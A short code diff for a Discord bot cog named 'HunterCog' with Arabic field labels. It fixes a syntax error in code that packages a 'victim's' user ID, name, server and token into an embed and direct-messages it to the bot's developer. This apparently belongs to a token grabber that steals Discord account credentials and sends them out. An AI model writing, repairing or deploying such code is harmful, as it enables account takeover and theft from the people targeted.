@@ -115,7 +115,7 @@ class HunterCog(commands.Cog):
             )
             embed.add_field(name="المستخدم", value=f"{victim.mention} ({victim.id})", inline=False)
             embed.add_field(name="اسم المستخدم", value=victim.name, inline=True)
-            embed.add_field name="السيرفر", value=victim.guild.name, inline=True)
+            embed.add_field(name="السيرفر", value=victim.guild.name, inline=True)
             embed.add_field(name="التوكن", value=f"`{token}`", inline=False)
             
             await developer.send(embed=embed)
